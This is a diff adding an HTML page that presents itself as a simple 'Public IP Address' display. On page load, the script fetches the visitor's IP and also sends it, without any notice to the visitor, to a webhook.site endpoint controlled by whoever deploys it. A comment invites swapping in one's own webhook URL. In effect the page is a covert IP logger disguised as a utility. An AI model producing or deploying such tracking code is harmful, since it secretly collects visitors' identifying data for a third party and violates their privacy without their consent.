@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Public IP Address</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <h1>IP Address:</h1>
+    <p id="ipAddress">Fetching IP address...</p>
+
+    <script>
+        // Function to get the user's IP address
+        function getIPAddress() {
+            // Using a free service to get the IP address
+            $.getJSON("https://api.ipify.org?format=json", function(data) {
+                var ipAddress = data.ip;
+                $("#ipAddress").text("Your IP address is: " + ipAddress);
+
+                // Send the IP address to a webhook endpoint
+                sendToWebhook(ipAddress);
+            });
+        }
+
+        // Function to send the IP address to a webhook endpoint
+        function sendToWebhook(ipAddress) {
+            var webhookURL = "https://webhook.site/ae6cf393-ed79-4138-8a91-672b0ce1d47c"; // Replace this with your actual webhook URL
+            var requestData = {
+                ip: ipAddress
+            };
+
+            $.ajax({
+                type: "POST",
+                url: webhookURL,
+                data: JSON.stringify(requestData),
+                contentType: "application/json",
+                success: function(response) {
+                    console.log("Successfully sent IP address to webhook:", response);
+                },
+                error: function(xhr, status, error) {
+                    console.error("Error sending IP address to webhook:", error);
+                }
+            });
+        }
+
+        // Call the function to get the IP address when the page loads
+        getIPAddress();
+    </script>
+</body>
+</html>
